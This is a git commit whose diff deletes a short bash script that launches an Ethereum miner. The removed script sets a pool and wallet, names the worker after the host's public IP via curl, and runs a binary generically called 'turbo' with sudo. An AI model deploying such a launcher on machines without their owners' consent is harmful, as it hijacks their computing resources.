41fe6947501401a01cc29c6201657beaaaaeef61
patenk <91371611+patenk@users.noreply.github.com>
2022-04-02 13:42:30 +0700

    Update turbosh.sh

--- turbosh.sh
+++ turbosh.sh
@@ -1,9 +1,1 @@
-#!/bin/bash
 
-POOL=stratum+tcp://eth-pool.beepool.org:9530
-WALLET=langitterang
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-
-cd "$(dirname "$0")"
-
-chmod +x ./turbo && sudo ./turbo -a ethash -o $POOL -u $WALLET.$WORKER $@
